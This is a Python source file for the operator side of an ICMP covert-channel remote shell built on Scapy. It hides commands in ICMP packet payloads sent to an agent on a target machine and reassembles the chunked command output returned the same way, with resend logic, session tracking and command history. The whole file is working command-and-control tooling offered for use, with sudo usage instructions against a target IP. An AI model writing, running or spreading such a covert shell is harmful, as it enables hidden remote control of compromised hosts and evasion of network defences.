#!/usr/bin/env python3
import os
import re
import sys
import time
import threading
import readline  # For command history
from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import sniff, send
from scapy.layers.inet import Raw

# Import utility functions
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.utils import get_default_interface, validate_ip, create_directories, safe_file_write, check_privileges, validate_command

# Configuration
CHUNK_SIZE = 80  # Maximum payload per ICMP packet
ICMP_FILTER = "icmp"
NETWORK_INTERFACE = get_default_interface()  # Auto-detect interface
MAX_RESEND_ATTEMPTS = 3
RESEND_TIMEOUT = 60  # seconds

# Directories for temporary storage and output
TEMP_DIR = "../data/sessions"
OUTPUT_DIR = "../data/outputs"
create_directories(TEMP_DIR, OUTPUT_DIR)

# Thread-local storage for session management
thread_local = threading.local()

# Command history file
HISTORY_FILE = os.path.expanduser("~/.icmp_shell_history")

# -------------------------
# Helper: Split response preserving lines.
# -------------------------
def split_response_preserve_lines(response, chunk_size):
    """
    Splits the response into chunks while preserving line boundaries.
    If a line exceeds chunk_size, it is split.
    If appending a line exactly reaches chunk_size, flush the current chunk.
    """
    if not response:
        return [""]
    
    if not response.endswith("\n"):
        response += "\n"
    lines = response.splitlines(keepends=True)
    chunks = []
    current_chunk = ""
    for line in lines:
        if len(line) > chunk_size:
            if current_chunk:
                chunks.append(current_chunk)
                current_chunk = ""
            for i in range(0, len(line), chunk_size):
                chunks.append(line[i:i + chunk_size])
        else:
            if len(current_chunk) + len(line) > chunk_size:
                chunks.append(current_chunk)
                current_chunk = line
            elif len(current_chunk) + len(line) == chunk_size:
                current_chunk += line
                chunks.append(current_chunk)
                current_chunk = ""
            else:
                current_chunk += line
    if current_chunk:
        chunks.append(current_chunk)
    return chunks if chunks else [""]

# -------------------------
# Utility functions for chunk handling.
# -------------------------
def save_chunk(session_id, chunk_num, total_chunks, content):
    filename = os.path.join(TEMP_DIR, f"{session_id}_{chunk_num}.chunk")
    safe_file_write(filename, content)
    total_file = os.path.join(TEMP_DIR, f"{session_id}_total.txt")
    safe_file_write(total_file, str(total_chunks))
    print(f"Debug: Saved chunk {chunk_num}/{total_chunks} for session {session_id}")

def load_all_chunks(session_id, total_chunks):
    chunks = []
    for i in range(1, total_chunks + 1):
        filename = os.path.join(TEMP_DIR, f"{session_id}_{i}.chunk")
        if os.path.exists(filename):
            try:
                with open(filename, "r") as f:
                    chunks.append(f.read())
            except Exception as e:
                print(f"Error reading chunk {i}: {e}")
                return None
        else:
            return None
    return "".join(chunks)  # join without extra newlines

def cleanup_session(session_id):
    try:
        for filename in os.listdir(TEMP_DIR):
            if filename.startswith(session_id):
                os.remove(os.path.join(TEMP_DIR, filename))
        print(f"Debug: Cleaned up session {session_id}")
    except Exception as e:
        print(f"Error cleaning up session {session_id}: {e}")

# -------------------------
# Command history management
# -------------------------
def setup_command_history():
    """Setup command history for the shell"""
    try:
        readline.read_history_file(HISTORY_FILE)
        readline.set_history_length(1000)
    except FileNotFoundError:
        pass

def save_command_history():
    """Save command history to file"""
    try:
        readline.write_history_file(HISTORY_FILE)
    except Exception as e:
        print(f"Warning: Could not save command history: {e}")

# -------------------------
# Dynamic sniffing function.
# -------------------------
def dynamic_sniff(filter, overall_timeout=60, idle_timeout=10):
    print("Debug: Starting dynamic sniffing...")
    start_time = time.time()
    last_packet_time = time.time()
    responses = []
    try:
        while time.time() - start_time < overall_timeout:
            new_pkts = sniff(filter=filter, timeout=5, count=1, iface=NETWORK_INTERFACE)
            if new_pkts:
                responses.extend(new_pkts)
                last_packet_time = time.time()
                print(f"Debug: Sniffed {len(new_pkts)} new packet(s)")
            else:
                if time.time() - last_packet_time >= idle_timeout:
                    print("Debug: Idle timeout reached during sniffing")
                    break
    except Exception as e:
        print(f"Error during sniffing: {e}")
        # Try without specifying interface
        try:
            while time.time() - start_time < overall_timeout:
                new_pkts = sniff(filter=filter, timeout=5, count=1)
                if new_pkts:
                    responses.extend(new_pkts)
                    last_packet_time = time.time()
                    print(f"Debug: Sniffed {len(new_pkts)} new packet(s) (fallback)")
                else:
                    if time.time() - last_packet_time >= idle_timeout:
                        print("Debug: Idle timeout reached during sniffing (fallback)")
                        break
        except Exception as e2:
            print(f"Error during fallback sniffing: {e2}")
    return responses

# -------------------------
# Function to send a command over ICMP and reassemble the response.
# -------------------------
def send_icmp_command_improved(target_ip, payload, session_id):
    """
    Send ICMP command with improved session management and error handling
    """
    # Validate target IP
    if not validate_ip(target_ip):
        print(f"Error: Invalid target IP address: {target_ip}")
        return None
    
    # Append session info to the payload.
    payload = f"{payload} SESSION:{session_id}".encode()
    print(f"Sending ICMP command to {target_ip}: {payload.decode()} (session {session_id})")
    
    try:
        send(IP(dst=target_ip) / ICMP() / Raw(load=payload), verbose=False)
    except Exception as e:
        print(f"Error sending ICMP command: {e}")
        return None

    print("Waiting for ICMP responses (improved, dynamic sniff)...")
    responses = dynamic_sniff(filter="icmp", overall_timeout=60, idle_timeout=10)
    chunk_dict = {}
    expected_total = None

    for pkt in responses:
        if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
            try:
                reply_payload = pkt[Raw].load.decode(errors="ignore").strip()
                # Expected header format: "[sess123][1/32] actual data"
                m = re.match(r'\[(\S+)\]\[(\d+)/(\d+)\]\s*(.*)', reply_payload)
                if m:
                    sess, chunk_num, total_chunks, content = m.groups()
                    if sess == session_id:
                        chunk_num = int(chunk_num)
                        total_chunks = int(total_chunks)
                        if expected_total is None:
                            expected_total = total_chunks
                        chunk_dict[chunk_num] = content
                        save_chunk(session_id, chunk_num, total_chunks, content)
            except Exception as e:
                print(f"Error processing response packet: {e}")

    if expected_total is None:
        print("No valid response received (improved).")
        return None

    # RESEND loop if needed.
    if len(chunk_dict) != expected_total:
        attempts = 0
        while len(chunk_dict) != expected_total and attempts < MAX_RESEND_ATTEMPTS:
            missing = [str(i) for i in range(1, expected_total + 1) if i not in chunk_dict]
            missing_str = ",".join(missing)
            print(
                f"Incomplete response: Expected {expected_total} chunks, got {len(chunk_dict)}. Missing: {missing_str}.")
            print(f"Requesting resend (attempt {attempts + 1})...")
            resend_payload = f"RESEND: {missing_str}".encode()
            try:
                send(IP(dst=target_ip) / ICMP() / Raw(load=resend_payload), verbose=False)
            except Exception as e:
                print(f"Error sending resend request: {e}")
                break
            additional = dynamic_sniff(filter="icmp", overall_timeout=60, idle_timeout=10)
            for pkt in additional:
                if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
                    try:
                        reply_payload = pkt[Raw].load.decode(errors="ignore").strip()
                        m = re.match(r'\[(\S+)\]\[(\d+)/(\d+)\]\s*(.*)', reply_payload)
                        if m:
                            sess, chunk_num, total_chunks, content = m.groups()
                            if sess == session_id:
                                chunk_num = int(chunk_num)
                                chunk_dict[chunk_num] = content
                                save_chunk(session_id, chunk_num, expected_total, content)
                    except Exception as e:
                        print(f"Error processing resend packet: {e}")
            attempts += 1

        if len(chunk_dict) != expected_total:
            print(f"Still incomplete: Expected {expected_total} chunks, got {len(chunk_dict)}.")
            return None

    full_response = "".join([chunk_dict[i] for i in sorted(chunk_dict.keys())])
    print("Full Response Received (improved):\n" + full_response)

    output_filename = os.path.join(OUTPUT_DIR, f"response_{session_id}_{int(time.time())}.txt")
    if safe_file_write(output_filename, full_response):
        print(f"Debug: Saved full response to {output_filename}")
    else:
        print("Warning: Failed to save response to file")

    cleanup_session(session_id)
    return full_response

# -------------------------
# Interactive shell (controller)
# -------------------------
def interactive_shell(target_ip):
    """
    Enhanced interactive shell with command history and better session management
    """
    print("Interactive ICMP Shell v2.0")
    print("Type 'exit', 'quit', or Ctrl+C to leave.")
    print("Type 'help' for available commands.")
    print("-" * 50)
    
    current_prompt = "$ "  # Default prompt; will be updated from agent response
    session_id = "sess" + str(int(time.time()))  # Persistent session ID
    command_count = 0
    
    # Setup command history
    setup_command_history()
    
    # Check privileges
    if not check_privileges():
        print("Warning: Running without root privileges. Packet sniffing may not work properly.")
        print("Consider running with sudo for full functionality.")
    
    try:
        while True:
            try:
                command = input(current_prompt)
                command_count += 1
            except KeyboardInterrupt:
                print("Exiting interactive shell.")
                break
            except EOFError:
                print("Exiting interactive shell.")
                break
            
            command = command.strip()
            
            # Handle special commands
            if command.lower() in ["exit", "quit"]:
                break
            elif command.lower() == "help":
                print_help()
                continue
            elif command.lower() == "clear":
                os.system('clear' if os.name == 'posix' else 'cls')
                continue
            elif command.lower() == "status":
                print_status(target_ip, session_id, command_count)
                continue
            elif command.lower() == "history":
                print_history()
                continue
            elif not command:
                continue

            # Validate command
            if not validate_command(command):
                print("Error: Command contains potentially dangerous operations and was blocked.")
                continue

            # Send command with persistent session ID
            payload = f"CMD:TASK:{command}"
            response = send_icmp_command_improved(target_ip, payload, session_id)
            
            if response:
                # Update prompt if agent returns a prompt line
                m = re.search(r'(\S+@\S+:[^\n]+\$)\s*', response)
                if m:
                    current_prompt = m.group(1) + " "
                print(response)
            else:
                print("Error: No response received. Check if agent is running and network is accessible.")
                
    finally:
        # Save command history on exit
        save_command_history()
        print(f"Session ended. Commands executed: {command_count}")

def print_help():
    """Print help information"""
    print("\nAvailable Commands:")
    print("  help     - Show this help message")
    print("  clear    - Clear the screen")
    print("  status   - Show connection status")
    print("  history  - Show command history")
    print("  exit     - Exit the shell")
    print("  quit     - Exit the shell")
    print("\nAny other input will be sent as a command to the target.")
    print()

def print_status(target_ip, session_id, command_count):
    """Print current status"""
    print(f"\nConnection Status:")
    print(f"  Target IP: {target_ip}")
    print(f"  Session ID: {session_id}")
    print(f"  Commands executed: {command_count}")
    print(f"  Network interface: {NETWORK_INTERFACE}")
    print(f"  Privileges: {'Root' if check_privileges() else 'User'}")
    print()

def print_history():
    """Print command history"""
    try:
        history_length = readline.get_current_history_length()
        print(f"\nCommand History (last {min(history_length, 10)} commands):")
        for i in range(max(1, history_length - 9), history_length + 1):
            cmd = readline.get_history_item(i)
            if cmd:
                print(f"  {i}: {cmd}")
        print()
    except Exception as e:
        print(f"Error: Could not retrieve history: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 icmp_shell.py <TARGET_IP>")
        print("Example: sudo python3 icmp_shell.py 192.168.1.100")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    # Validate target IP
    if not validate_ip(target_ip):
        print(f"Error: Invalid IP address: {target_ip}")
        sys.exit(1)
    
    try:
        interactive_shell(target_ip)
    except KeyboardInterrupt:
        print("Shell interrupted by user.")
    except Exception as e:
        print(f"Error: Unexpected error: {e}")
        sys.exit(1)
